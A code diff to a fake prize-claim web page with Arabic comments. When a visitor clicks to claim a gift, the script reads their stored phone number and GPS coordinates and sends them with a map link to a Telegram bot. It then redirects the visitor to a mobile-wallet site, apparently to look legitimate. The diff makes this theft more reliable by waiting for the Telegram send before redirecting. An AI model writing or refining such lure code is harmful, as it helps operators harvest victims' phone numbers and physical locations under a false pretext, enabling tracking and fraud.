@@ -69,45 +69,48 @@
       document.getElementById('claimButton').disabled = true;
     }
 
-    function claimGift() {
+    async function claimGift() {
       const phone = localStorage.getItem("userPhone") || "";
       const code = localStorage.getItem("userCode") || generateCode();
 
-      // اهتزاز الجهاز
       if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
 
-      // حفظ الكود إذا لم يكن محفوظًا مسبقًا
       localStorage.setItem("userCode", code);
-
-      // عرض الكود
       document.getElementById('contestantCode').textContent = code;
       document.getElementById('codeDisplay').style.display = 'block';
+      document.getElementById('claimButton').disabled = true;
 
-      // إرسال الموقع للتليجرام
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+      try {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
 
-          const message = `🎁 استلام الجائزة\n📱 رقم الهاتف: ${phone}\n🏷 كود المتسابق: ${code}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `🎁 استلام الجائزة\n📱 رقم الهاتف: ${phone}\n🏷 كود المتسابق: ${code}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
 
-          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message
-            })
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+              })
+            });
+
+            // ✅ بعد الإرسال: تحويل المستخدم
+            window.location.href = "https://jawali.com.ye";
+          }, () => {
+            alert("تعذر الحصول على الموقع.");
+            window.location.href = "https://jawali.com.ye";
           });
-        }, () => {
-          alert("تعذر الحصول على الموقع.");
-        });
-      } else {
-        alert("المتصفح لا يدعم الموقع الجغرافي.");
+        } else {
+          alert("المتصفح لا يدعم الموقع الجغرافي.");
+          window.location.href = "https://jawali.com.ye";
+        }
+      } catch (error) {
+        console.error("فشل الإرسال إلى تليجرام:", error);
+        window.location.href = "https://jawali.com.ye";
       }
-
-      // إعادة التوجيه إلى موقع jawali.com.ye
-      window.location.href = "https://jawali.com.ye";
     }
 
     function generateCode() {
